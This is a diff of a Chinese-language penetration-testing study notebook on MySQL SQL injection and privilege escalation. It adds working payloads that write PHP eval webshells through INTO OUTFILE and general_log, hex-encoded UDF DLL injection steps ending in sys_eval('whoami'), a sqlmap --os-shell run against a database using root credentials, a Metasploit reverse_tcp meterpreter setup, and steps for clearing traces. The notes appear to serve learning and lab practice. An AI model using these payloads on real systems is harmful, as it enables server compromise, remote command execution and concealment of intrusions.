@@ -27,13 +27,13 @@
 - 熟悉数据库的基本操作（以MySQL为例）
 
     - 下载mysql数据库并安装好。
-    
+
     - 打开cmd，输入mysql，如果显示**没有找到指令或程序**之类的错误提示，需要在环境变量中添加mysql的路径。
-    
+
     - 添加成功后，在cmd中输入`mysql -uroot -proot`，在最下面一行会出现“**mysql**>”字样，表示成功进入数据库。
-    
+
     - 以下是查看数据库信息的一些操作指令：
-    
+
         ```sql
         show databases;				#查看所有数据库
         create database 数据库名；    #创建一个数据库
@@ -45,6 +45,33 @@
         desc 表名;				   #查看某个表格的属性
         show colmuns from 表名;	   #查看某个表格的属性
         ```
+
+    - 数据库开启局域网登陆
+
+        - ```mysql
+            .\mysql.exe  -u root -p123456
+            
+            use mysql
+            update user set host = '%' where user = 'root';
+            flush privileges;
+            select host, user from user;
+            重启mysql服务器
+            
+            
+            结果
+            mysql> select host, user from user;
+            +-----------+---------------+
+            | host      | user          |
+            +-----------+---------------+
+            | %         | root          |
+            | localhost | lambo         |
+            | localhost | mysql.session |
+            | localhost | mysql.sys
+            
+            
+            ```
+
+- BLOB (binary large object)，二进制大对象，是一个可以存储二进制文件的容器。在计算机中，BLOB常常是数据库中用来存储二进制文件的字段类型。BLOB是一个大文件，典型的BLOB是一张图片或一个声音文件，由于它们的尺寸，必须使用特殊的方式来处理（例如：上传、下载或者存放到一个数据库）。
 
 - 网站使用数据库
 
@@ -63,23 +90,23 @@
         
         "select * from table_name where user ="+user+"and password ="+password
         ```
-    
+
 - **在安装好MySQL之后自带了一些系统数据库（sql注入就是要利用这个来获得数据**）。
-  
+
     - ![image-20211208113721155](sql注入/image-20211208113721155.png)
-    
+
     - 最重要的就是自带的**information_schema数据库**。它是系统数据库，记录是当前数据库的数据库，表，列，用户权限等信息
-    
+
     - **information_scema数据库有schemata，tables，columns三个重要的表。**
-    
+
     - 常用sql语句。
-    
+
         ```sql
         select schema_name from information_schema.schemata;	#查询所有数据库名
         select table_name from information_schema.tables where table_schema='test';	#查询test数据库中的所有数据表名
         select column_name from information_schema.columns where table_schema='test' and table_name='users';		#查询test数据库中的users数据表的所有列名
         ```
-    
+
 
 ### 为什么会产生sql注入漏洞
 
@@ -256,90 +283,93 @@ SQL注入漏洞了。
 
 ### 文件读写：写webshell，然后连接。
 
-- 当有显示列的时候，文件读可以利用     union 注入。
+- 当有显示列的时候，文件读可以利用union 注入。
 
 - 当没有显示列的时候，只能利用盲注进行数据读取。
 
-- union注入读写文件(load_file函数和select     into outfile语句):
+- union注入读写文件(load_file函数和select  into outfile语句):
 
-    - 读文件
+- 读文件（）
 
-    - ```mysql
+    1. 可以读取敏感文件，也可以发起网络请求，dnslog
+
+    2. 条件限制：
+
+        - 必须有权限读取并且文件必须完全可读。
+
+        - ```
+            and (select count(*) from mysql.user)>0 /*如果结果返回正常，说明具有读写权限.*/
+            and (select count(*) from mysql.user)>0 /* 返回错误，应该是管理员给数据库账户降权了*/
+            ```
+
+        - 欲读取文件必须在服务器上
+
+        - 欲读取文件必须小于max_allowed_packet　　
+
+        - 如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限。
+
+        - 在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到administrators才能访问的文件，users就不能实现用load_file读取文件了
+
+    3. ```mysql
         #需要知道文件的物理路径：
         union select 1,2,load_file("e:/3.txt")#， 
         可以将path转成16进制，
-        
         `union select 1,2,load_file(0x653a2f332e747874)#`   
         e:/3.txt 转换成16进制 0x653a2f332e747874
+        
+        如果显示读出来的是blob二进制对象，可以使用下面这行命令转换成字符串
+        select 1,2,CONVERT(load_file("d:/1.php") USING utf8mb4); 
         ```
 
-        写文件
+- 写文件
 
-        - 需要对目标目录具有写权限
+    - 需要对目标目录具有写权限
 
-        - 要知道网站的绝对路径
+    - 要知道网站的绝对路径
 
-        - GPC关闭(GPC:是否对单引号转义)
+    - GPC关闭(GPC:是否对单引号转义)
 
-        - 没有配置secure-file-priv。可以通过select @@secure_file_priv;查询
+    - 没有配置secure-file-priv。可以通过select @@secure_file_priv;查询
 
-            - ```
-                如果为NULL,则不能写入
-                （2）：如果为空，可以在任意文件位置下写入
-                （3）：如果为一个路径，可以在该文件路径写入
-                ```
-        
-        - **root权限**
-        
-        - ```sql
-            union select 1,2,'<?php     @eval($_POST[aaa]);?>' into     outfile 'e:/4.php' 
-            #可以将一句话木马转换成16进制的形式：
-            union select 1,2,0x3c3f70687020406576616c28245f504f53545b6161615d293b3f3e  into outfile
-            
-            #利用分隔符写入
-            ?id=1 into outfile 'D:/WWW/evil.php' fields terminated by '<?php assert($_POST["cmd"]);?>'
-            
-            ?id=1 into outfile 'D:/WWW/evil.php' lines terminated by '<?php phpinfo() ?>'--+
-            
-            ?id=1 LIMIT 0,1 INTO OUTFILE 'D:/WWW/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --+
-            
-            #同样的技巧，一共有四种形式
-            ?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
-            
-            ?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
-            
-            ?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
-            
-            ?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
-            
-            ```
-        
-    - **新版本的MySQL设置了导出文件的路径，很难在获取Webshell过程中去修改配置文件，无法通过使用select into outfile来写入一句话。这时，我们可以通过修改MySQL的log文件来获取Webshell。**
-
-    - **需要满足的条件**
-
-        - 对web目录有写权限
-
-        - GPC关闭(GPC:是否对单引号转义)
-
-        - 有绝对路径(读文件可以不用，写文件需要)
-
-        - 需要能执行多行SQL语句
-
-        - ```sql
-            show variables like '%general%';            	 # 查看配置
-            
-            set global general_log = on;              		 # 开启general log模式,将所有到达MySQL Server的SQL语句记录下来。
-            
-            set global general_log_file = 'D:/WWW/evil.php'; # 设置日志目录为shell地址
-            
-            select '<?php eval($_GET[g]);?>'             	 # 写入shell
-            
-            set global general_log=off;                  	 # 关闭general log模式
-            
+        - ```
+            如果为NULL,则不能写入
+            （2）：如果为空，可以在任意文件位置下写入
+            （3）：如果为一个路径，可以在该文件路径写入
             ```
 
-    - 在高版本的mysql中默认为NULL，就是不让导入和导出
+    - **root权限**
+
+    - ```sql
+        union select 1,2,'<?php     @eval($_POST[aaa]);?>' into     outfile 'd:/1.php' 
+        #1.php的 文件内容1	2	<?php     @eval($_POST[aaa]);?>
+        
+        #可以将一句话木马转换成16进制的形式：
+        union select 1,2,0x3c3f70687020406576616c28245f504f53545b6161615d293b3f3e  into outfile 'd:/1.php' 
+        #文件内容和上面一样，mysql会自动将16进制转换成字符串
+        
+        #利用分隔符写入
+        ?id=1 into outfile 'D:/WWW/evil.php' fields terminated by '<?php assert($_POST["cmd"]);?>'
+        
+        ?id=1 into outfile 'D:/WWW/evil.php' lines terminated by '<?php phpinfo() ?>'--+
+        
+        ?id=1 LIMIT 0,1 INTO OUTFILE 'D:/WWW/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --+
+        
+        #同样的技巧，一共有四种形式
+        ?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
+        
+        ?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
+        
+        ?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
+        
+        ?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
+        
+        ```
+
+    - ```
+        into dumpfile()：只能写一行,而且没有转义符号，也就是没有换行之类的功能
+        ```
+
+    1. 在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL。并且无法用sql语句对其进行修改，就是不让导出
 
         - ```bash
             解决办法：
@@ -363,15 +393,39 @@ SQL注入漏洞了。
             show global variables like '%long_query_time%'; #使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间
             ```
 
-- ```sql
-    --os-cmd="net user"
-    #交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。
-    
-    --os-shell
-    #写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。
-    #注意:关闭sqlmap文件就会被删除。
-    
-    ```
+        - **通过修改MySQL的log文件来获取Webshell。**
+
+            - **需要满足的条件**
+
+                - 对web目录有写权限
+
+                - GPC关闭(GPC:是否对单引号转义)
+
+                - 有绝对路径(读文件可以不用，写文件需要)
+
+                - 需要能执行多行SQL语句
+
+            - ```
+                show variables like '%general%';            	 # 查看配置
+                
+                set global general_log = on;              		 # 开启general log模式,将所有到达MySQL Server的SQL语句记录下来。
+                
+                set global general_log_file = 'D:/WWW/evil.php'; # 设置日志目录为shell地址
+                
+                select '<?php eval($_GET[g]);?>'             	 # 写入shell
+                
+                set global general_log=off;                  	 # 关闭general log模式
+                ```
+
+        - ```sql
+            --os-cmd="net user"
+            #交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。
+            
+            --os-shell
+            #写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。
+            #注意:关闭sqlmap文件就会被删除。
+            ```
+
 
 ### 双查询报错注入(一次最多爆出32位字符)
 SQL语句中有语法错误，根据返回的错误信息，可以察觉到一些数据库信息。
@@ -587,10 +641,10 @@ HANDLER FlagHere  close;#                                             关闭这�
 ### header注入
 
 1. 头部注入-Uagent字段 本质是头部字段与name passwd一样都insert数据库了，可以看页面是否回显了头部的一些信息，判断是否有头部注入
-  insert语句在value部分与平时一样可以进行其它sql操作,  在http首部更改user-agent的值通过双注入注入  与平常name注入无区别  User-Agent:'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '
+    insert语句在value部分与平时一样可以进行其它sql操作,  在http首部更改user-agent的值通过双注入注入  与平常name注入无区别  User-Agent:'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '
 2. 基于头部的Referer： 与uagent一样
 3. cookie注入-Content字段-基于错误
-  cookie中保存了用户名，然后后台通过cookie内的用户名进行sql操作，所以可以通过在cookie内将用户名部分负载载荷，就可以和普通注入一样
+    cookie中保存了用户名，然后后台通过cookie内的用户名进行sql操作，所以可以通过在cookie内将用户名部分负载载荷，就可以和普通注入一样
 4. 如果cookie是被编码了的（例如base64）则 payload同样需要编码，
 5. cookie后来进行sql查询时可能也被单引号，双引号编码了，所以也要闭合,多试几次引号，括号。
 
@@ -791,6 +845,60 @@ sqlmap基本使用
     | **--sql-shell**                                              | 返回一个sql shell，用以执行sql语句，但是一般只支持查询命令，**其他命令需要漏洞存在堆叠注入。** |
     | --file-write "/localwebshell"     --file-dest "网站的绝对路径/1.php"。 | 创建webshell.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址,用户必须具有最高权限 |
     | **--roles**                                                  | **列出数据库管理员权限**                                     |
+
+- 知道数据库root账号密码之后，udf提权：
+
+    - ```cmd
+        python sqlmap.py -d "mysql://root:123456@119.90.126.9:3306/dedecms" --os-shell 
+        
+        
+        (base) PS D:\pentest_tool\3.web渗透\sql\sqlmap> python .\sqlmap.py -d "mysql://root:123456@172.27.208.1:3306/jsh_erp" --os-shell
+                ___
+               __H__
+         ___ ___[']_____ ___ ___  {1.6.8.2#dev}
+        |_ -| . [)]     | .'| . |
+        |___|_  [(]_|_|_|__,|  _|
+              |_|V...       |_|   https://sqlmap.org
+        
+        [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+        
+        [*] starting @ 11:41:19 /2022-09-23/
+        
+        [11:41:19] [INFO] connection to MySQL server '172.27.208.1:3306' established
+        [11:41:19] [INFO] testing MySQL
+        [11:41:19] [INFO] confirming MySQL
+        [11:41:19] [INFO] the back-end DBMS is MySQL
+        [11:41:19] [WARNING] (remote) ProgrammingError: (MySQLdb.ProgrammingError) not enough arguments for format string
+        [11:41:19] [WARNING] (remote) ProgrammingError: (MySQLdb.ProgrammingError) not enough arguments for format string
+        [11:41:19] [WARNING] (remote) ProgrammingError: (MySQLdb.ProgrammingError) not enough arguments for format string
+        [11:41:19] [WARNING] (remote) ProgrammingError: (MySQLdb.ProgrammingError) not enough arguments for format string
+        [11:41:19] [WARNING] (remote) ProgrammingError: (MySQLdb.ProgrammingError) not enough arguments for format string
+        back-end DBMS: MySQL >= 5.0.0
+        [11:41:19] [INFO] fingerprinting the back-end DBMS operating system
+        [11:41:19] [INFO] the back-end DBMS operating system is Windows
+        [11:41:19] [WARNING] (remote) OperationalError: (MySQLdb.OperationalError) (1051, "Unknown table 'jsh_erp.sqlmapfile'")
+        [11:41:19] [WARNING] (remote) OperationalError: (MySQLdb.OperationalError) (1051, "Unknown table 'jsh_erp.sqlmapfilehex'")
+        [11:41:19] [INFO] testing if current user is DBA
+        [11:41:19] [INFO] fetching current user
+        what is the back-end database management system architecture?
+        [1] 32-bit (default)
+        [2] 64-bit
+        > 2
+        [11:41:26] [INFO] checking if UDF 'sys_exec' already exist
+        [11:41:26] [INFO] checking if UDF 'sys_eval' already exist
+        [11:41:26] [INFO] detecting back-end DBMS version from its banner
+        [11:41:26] [INFO] retrieving MySQL plugin directory absolute path
+        [11:41:26] [WARNING] (remote) OperationalError: (MySQLdb.OperationalError) (1051, "Unknown table 'jsh_erp.sqlmapfile'")
+        [11:41:27] [INFO] the local file 'C:\Users\lambo\AppData\Local\Temp\sqlmapjksern2t8548\lib_mysqludf_sysw9u2rt_d.dll' and the remote file 'D:/app/phpstudy_pro/Extensions/MySQL5.7.26/lib/plugin/libsjzdw.dll' have the same size (7168 B)
+        [11:41:27] [WARNING] (remote) OperationalError: (MySQLdb.OperationalError) (1051, "Unknown table 'jsh_erp.sqlmapfilehex'")
+        [11:41:27] [INFO] creating UDF 'sys_exec' from the binary UDF file
+        [11:41:27] [WARNING] (remote) OperationalError: (MySQLdb.OperationalError) (1305, 'FUNCTION jsh_erp.sys_exec does not exist')
+        [11:41:27] [INFO] creating UDF 'sys_eval' from the binary UDF file
+        [11:41:27] [WARNING] (remote) OperationalError: (MySQLdb.OperationalError) (1305, 'FUNCTION jsh_erp.sys_eval does not exist')
+        [11:41:27] [WARNING] (remote) OperationalError: (MySQLdb.OperationalError) (1051, "Unknown table 'jsh_erp.sqlmapoutput'")
+        [11:41:27] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
+        [11:41:27] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press ENTER
+        ```
 
 ## 绕过简单过滤/转义
 
@@ -1491,8 +1599,6 @@ ResultSet resultSet = pstt.executeQuery(sql);//返回结果集，封装了全部
       }
       ```
 
-      
-
 - 字符的转义
   - 例如输入的单引号，前面加上转义符号。
 
@@ -1585,46 +1691,33 @@ ResultSet resultSet = pstt.executeQuery(sql);//返回结果集，封装了全部
 
 ### **UDF提权：**
 
+- > https://www.freebuf.com/articles/database/291175.html
+
 - 数据库本身的权限和系统的权限要分开来，有时候webshell权限可能很低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了，由于windows安装的mysql进程一般都拥有管理员权限，这就意味着用户自定义的函数也拥有管理员权限，我们也就拥有了执行管理员命令的权限，这时新建管理员用户等操作也就轻而易举了，大多数人称为这一操作为udf提权，其实表达不够准确，应该称为通过mysql获得管理员权限。
+
+- Linux 一般情况下的是没有权限导出 udf 到 mysql 的插件目录的，除非有特殊的情况,所以一般很难。
+
 - 需要数据库账号和密码：
-- ![img](https://img2022.cnblogs.com/blog/2724230/202204/2724230-20220413220509829-571637118.png)
+
+    - ![img](https://img2022.cnblogs.com/blog/2724230/202204/2724230-20220413220509829-571637118.png)
 
 - **UDF (user defined function)**，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，其实就像使用本地MySQL函数如 user() 或 concat() 等。那么，我们该如何使用UDF呢？
 
-- 假设我的UDF文件名为 udf.dll，存放在MySQL安装目录的` lib/plugin `目录下(当MySQL>5.1，该目录默认不存在)。
+    - 假设我的UDF文件名为 udf.dll，存放在MySQL安装目录的` lib/plugin `目录下(当MySQL>5.1，该目录默认不存在)。
 
-- udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：
+    - udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：
 
-    |       版本        |                            路径                            |
-    | :---------------: | :--------------------------------------------------------: |
-    |    MySQL < 5.0    |                       导出路径随意；                       |
-    | 5.0 <= MySQL< 5.1 | 需要导出至目标服务器的系统目录（如：c:/windows/system32/） |
-    |    5.1 < MySQL    |       必须导出到MySQL安装目录下的lib\plugin文件夹下        |
+    - 
 
-- **一般Lib、Plugin文件夹需要手工建立（可用NTFS ADS流模式突破进而创建文件夹）**
+    - |       版本        |                            路径                            |
+        | :---------------: | :--------------------------------------------------------: |
+        |    MySQL < 5.0    |                       导出路径随意；                       |
+        | 5.0 <= MySQL< 5.1 | 需要导出至目标服务器的系统目录（如：c:/windows/system32/） |
+        |    5.1 < MySQL    |       必须导出到MySQL安装目录下的lib\plugin文件夹下        |
 
-- 在 udf.dll 文件中，我定义了名为 sys_eval() 的 MySQL 函数，该函数可以执行系统任意命令。但是如果我现在就打开 MySQL 命令行，使用 select sys_eval('whoami')；的话，系统会返回 sys_eval() 函数未定义。因为我们仅仅是把 udf.dll 放到了 lib/plugin 目录下，并没有引入。类似于面向对象编程时引入包一样，如果没有引入包，那么这个包里的类你是用不了的。
+    -  然后向mysql注册xxx.dll `create function sys_eval returns string soname 'udf.dll';`
 
-- 所以，我们应该把 udf.dll 中的自定义函数引入进来。看一下官方文档中的语法：
-
-    `create function sys_eval returns string soname 'udf.dll';`
-
-- 只有两个变量:
-
-    - 一个是     function_name（函数名），我们想引入的函数是 sys_eval。
-    - 还有一个变量是     shared_library_name（共享包名称），即 udf.dll 。
-
-- 至此我们已经引入了 sys_eval 函数，下面就可以使用了。
-
-    这个函数用于执行系统命令，用法如下：
-
-    `select * from mysql.func where name = 'sys_eval'; #查看创建的sys_eval函数`
-
-    `select sys_eval('whoami'); #使用系统命令`
-
-- 当     MySQL< 5.1 版本时，将 .dll 文件导入到 c:\windows 或者 c:\windows\system32 目录下。
-
-- 当     MySQL> 5.1 版本时，将 .dll 文件导入到 MySQL Server 5.xx\lib\plugin 目录下     (lib\plugin目录默认不存在，需自行创建)。
+- **一般Lib、Plugin文件夹需要手工建立**
 
 - **将dll上传方式推荐几种**:
 
@@ -1633,37 +1726,141 @@ ResultSet resultSet = pstt.executeQuery(sql);//返回结果集，封装了全部
 
 - **UDF提权步骤**:
 
-    - **查看 secure_file_priv  的值**,`show global variables like 'secure%'`;我们先查看 secure_file_priv 的值是否为空，因为只有为空我们才能继续下面的提权步骤。
+    - **查看 secure_file_priv  的值**,
+
+        - `show global variables like 'secure%';`
+
+        - 我们先查看 secure_file_priv 的值是否为空，因为只有为空我们才能继续下面的提权步骤。为指定路径则是指定路径可写，null表示不允许写
+
+        - 在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL，但是可以通过其他方法写文件。
 
     - **查看系统架构以及plugin目录**
 
+        ```mysql
+        show variables like '%compile%';    #查看主机版本及架构，以此确定是32位还是64位的udf文件
+        select @@basedir; #查看mysql安装位置
+        show variables like 'plugin%'; #查看 plugin 目录 ，这样就可以查到插件路径了,无论有没有这个目录，都会显示它的路径，所以需要我们创建这个路径
         ```
-        show variables like '%compile%'; #查看主机版本及架构
-        show variables like 'plugin%'; #查看 plugin 目录
-        
-        这里是 x64 位的系统，我们可以去kali中 /usr/share/metasploit-framework/data/exploits/mysql/ 目录下载64位的 .dll 文件。(由于我这里MSF更改过，所以路径有所不同)
-        ```
+
+    - 创建plugin目录（如果没有的话）
+
+        - 写入webshell再去创建
+
+        - ```mysql
+            select 'It is dll' into dumpfile 'C:\\phpStudy\\MySQL\\lib::$INDEX_ALLOCATION'; 
+            //利用NTFS ADS创建lib目录
+            select 'It is dll' into dumpfile 'C:\\phpStudy\\MySQL\\lib\\plugin::$INDEX_ALLOCATION'; 
+            //利用NTFS ADS创建plugin目录
+            #win10下复现，显示权限不允许。
+            #https://www.freebuf.com/articles/database/291175.html。经实践在命令提示符下使用ADS文件流是可以成功创建目录或者文件名的，但在独立安装的mysql数据库环境与phpstudy自带mysql环境下均创建失败，并且查阅网上各种文章也都是没有利用成功的，严重怀疑是哪位小可爱臆想出来的，但为了文章完整性还是决定写出来。
+            ```
+
+    - ##### **有webshell时，直接上传udf文件。**
+
+        - 当 MySQL< 5.1 版本时，将 .dll 文件导入到 c:\windows 或者 c:\windows\system32 目录下。
+
+        - 当MySQL> 5.1 版本时，将 .dll 文件导入到 MySQL Server 5.xx\lib\plugin 目录下     (lib\plugin目录默认不存在，需自行创建)。
+
+        - #### **sqlmap中：sqlmap\data\udf\mysql**
+
+            - 有linux，有windows版本的，32位，64位
+
+            - 使用cloal.py解码udf.dll，会得到udf.dll
+
+                - ```cmd
+                    python .\cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_
+                    ```
+
+                - sys_eval，执行任意系统命令，并将输出返回。
+
+                - sys_exec，执行任意系统命令，并将退出码返回（无命令执行结果回显）。
+
+            - ##### **16进制编码udf文件**
+
+                - 可以使用自己的mysql
+
+                - ```mysql
+                    select hex(load_file('D:\\pentest_tool\\web渗透\\sql\\sqlmap\\data\\udf\\mysql\\windows\\64\\lib_mysqludf_sys.dll')) into dumpfile 'D:\\pentest_tool\\1.txt';
+                    #输入和输出的文件的路径不能有.  不然后面就被当作文件名，而不是路径了
+                    ```
+
+            - payload有一万多个字节
+
+                - ```
+                    4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD189........................................................................................
+                    ```
 
     - **将dll文件写入plugin目录,并且创建函数**
 
+        - ##### **将16进制编码后udf文件使用dumpfile函数写入磁盘（outfile导出文件会在末尾写入新行且转义换行符，破坏二进制文件结构，dumpfile不会进行任何操作）。**
+
+        - **由于不同环境下的mysql命令提示符可输入字符最大长度不同（win2003为8191，win10系统为65535），无法使用dumpfile一次性写入全部16进制字符，则需要将udf文件的16进制编码字符先进行切割，再拼接写入到一个表中，最后导出到目标系统。**
+
+        - 注意：在进行16进制数据切割时，每段字符的长度要为4的倍数，2进制转为16进制使用取四合一法，如果位数不够会在最高位补0，补0后会破坏原始二进制文件的文件结构导致利用失败，这也是很多人此方法复现失败的原因。
+
+        -  **随便选择一个数据库后，创建一个表**
+
         ```sql
-        1) create table temp(data longblob);
-        2) insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);
-        3) update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);
-        4) select data from temp into dumpfile "G:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll";
-        5) create function sys_eval returns string soname 'udf.dll'; #创建函数sys_eval
-        执行select data from temp into dumpfile "G:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll"; 时有可能会出现以下错误，因为当MySQL大于5.1时，默认是没有 lib\plugin 目录的。而 into dumpfile在写入文件时也不能创建文件夹，所以也就报错了：Can't create/write to file
+        create table temp(data longblob);
+        insert into temp(data) values (0xxxxxxxx);
+        update temp set data = concat(data,0xxxxxxxxxxxxxx);
+        update temp set data = concat(data,0xxxxxxxxxxxxxx);
+        update temp set data = concat(data,0xxxxxxxxxxxxxx);
+        update temp set data = concat(data,0xxxxxxxxxxxxxx);
+        select data from temp into dumpfile "D:\\app\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll";
         
         
-        而在执行 create function sys_eval returns string soname 'udf.dll'; 命令时出现 1126 - Can't open shared library 'udf.dll'的错误。我看网上有的解释是说是因为在MySQL安装目录下默认没有 lib\plugin 目录导致的。但是我不认为是这个错误，因为如果上一步将dll文件写到 lib\plugin 目录没报错的话，说明dll文件已经写到 lib\plugin 目录了，因此也就不存在这个错误。但是目前还没有找到解决版本。
+        #注册dll并执行系统命令
+        create function sys_eval returns string soname 'udf.dll'; #创建函数sys_eval
+        select * from mysql.func where name = 'sys_eval'; #查看创建的sys_eval函数
+        select sys_eval('whoami'); #使用系统命令
+        
+        #dumpfile变量显示未声明，是因为secure_file_priv的值为null
+        
+        #执行select data from temp into dumpfile "G:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll"; 时有可能会出现以下错误，因为当MySQL大于5.1时，默认是没有 lib\plugin 目录的。而 into dumpfile在写入文件时也不能创建文件夹，所以也就报错了：Can't create/write to file
+        
+        
+        #ERROR 1125 (HY000): Function 'sys_eval' already exists
+        提示sys_eval 函数已经存在，可能已经被利用过了，尝试直接调用函数。
+        #2、提示sys_eval 函数已经存在，但无法利用
+        尝试将udf提权相关的利用函数进行删除后重新创建
+        
+        #3、创建sys_eval 函数时提示已经存在，但利用与删除时提示 sys_eval
+        函数不存在（实战无法解决，漏洞复现可以）。**
+        原因是上一个人利用过后，数据库进行了重启。
+        
+        #ERROR 1126 (HY000): Can't open shared library 'udf.dll' (errno: 193 )
+        在进行udf提权时碰到这个错误一般是ufd文件位数选择错误，尝试另一个位数的udf文件。
         
         ```
 
-    - 在将 udf.dll 文件写入plugin目录后，我们就可以使用 sys_eval 函数了。
+        - win10下复现成功，但是要关闭杀软。
 
-- 如果得到了数据库的用户名和密码，并且可以远程连接的话，可以使用MSF里面的 **exploit/multi/mysql/mysql_udf_payload** 模块自动注入。
+    - 痕迹清除
 
-    - 使用MSF中的 exploit/multi/mysql/mysql_udf_payload 模块也可以进行UDF提权。MSF会将dll文件写入lib\plugin\目录下(前提是该目录存在，如果该目录不存在的话，则无法执行成功)，dll文件名为任意创建的名字。该dll文件中包含sys_exec()和sys_eval()两个函数，但是默认只创建sys_exec()函数，该函数执行并不会有回显。我们可以手动创建 sys_eval() 函数，来执行有回显的命令。
+        - **删除表**：drop table temp;
+        - **删除函数**：drop function sys_eval;
+        - webshell上删除.dll 文件
+
+- **自动化udf提权**
+
+    - 如果得到了数据库的用户名和密码，并且可以远程连接的话，可以使用MSF里面的 **exploit/multi/mysql/mysql_udf_payload** 模块或者**sqlmap**自动注入。
+
+    - msf
+        - 使用MSF中的 exploit/multi/mysql/mysql_udf_payload 模块也可以进行UDF提权。MSF会将dll文件写入lib\plugin\目录下(前提是该目录存在，如果该目录不存在的话，则无法执行成功)，dll文件名为任意创建的名字。该dll文件中包含sys_exec()和sys_eval()两个函数，但是默认只创建sys_exec()函数，该函数执行并不会有回显。我们可以手动创建 sys_eval() 函数，来执行有回显的命令。
+        
+        - ```
+            use exploit/multi/mysql/mysql_udf_payload
+            set payload windows/x64/meterprete
+            r/reverse_tcp
+            set RHOSTS 172.23.208.1
+            set password 123456
+            run
+            ```
+        
+        - 经测试没有sqlmap好用，sqlmap有用，msf没有复现成功(因为Metasploit提供的exploit适应于5.5.9以下)。
+        
+    - `python sqlmap.py -d "mysql://root:123456@119.90.126.9:3306/dedecms" --os-shell `
 
 - **UDF提权后如何反弹shell**
 
@@ -1672,13 +1869,107 @@ ResultSet resultSet = pstt.executeQuery(sql);//返回结果集，封装了全部
     - `sqlmap -u "http://192.168.10.130/?id=2" --file-write msf.exe --file-dest "C:\phpStudy\PHPTutorial\MySQL\data\hack.exe"`
     - 执行木马反弹。这里需要注意的是，**sys_eval函数只能执行当前目录下的文件，所以，也只能把文件写入当前路径下。**
 
-- **启动项提权：**
+### **启动项提权：**
 
-    - **传送门——> [MySQL启动项提权**](https://www.cnblogs.com/wh4am1/p/6613759.html)，利用MySQL，将后门写入开机启动项。同时因为是开机自启动，再写入之后，需要重启目标服务器，才可以运行，不常用。从系统普通用户权限——>系统管理员权限。
+-   [MySQL启动项提权](https://www.cnblogs.com/wh4am1/p/6613759.html)，利用MySQL，将后门写入开机启动项。同时因为是开机自启动，在写入之后，需要重启目标服务器，才可以运行。不常用。从系统普通用户权限——>系统管理员权限。
 
-- mof提权
+### mof提权
 
-    - 传送门——>mysql之mof提权详解，只适用于windows系统，一般低版本系统才可以用，比如xp，server2003，比较麻烦，不常用。从系统普通用户权限——>系统管理员权限。
+- https://www.cnblogs.com/zzjdbk/p/12991468.html
+
+- 只适用于windows系统，一般低版本系统才可以用，比如xp，server2003，比较麻烦，不常用。从系统普通用户权限——>系统管理员权限。
+
+- **mof提权原理**
+
+    - 关于 mof 提权的原理其实很简单，就是利用了 c:/windows/system32/wbem/mof/ 目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。下面简单演示下 mof 提权的过程！
+
+- **MOF提权的条件要求十分严苛：**
+
+    - 1.windows 2003及以下版本
+    - 2.mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录 即secure-file-priv值为空
+
+- **MOF文件**
+
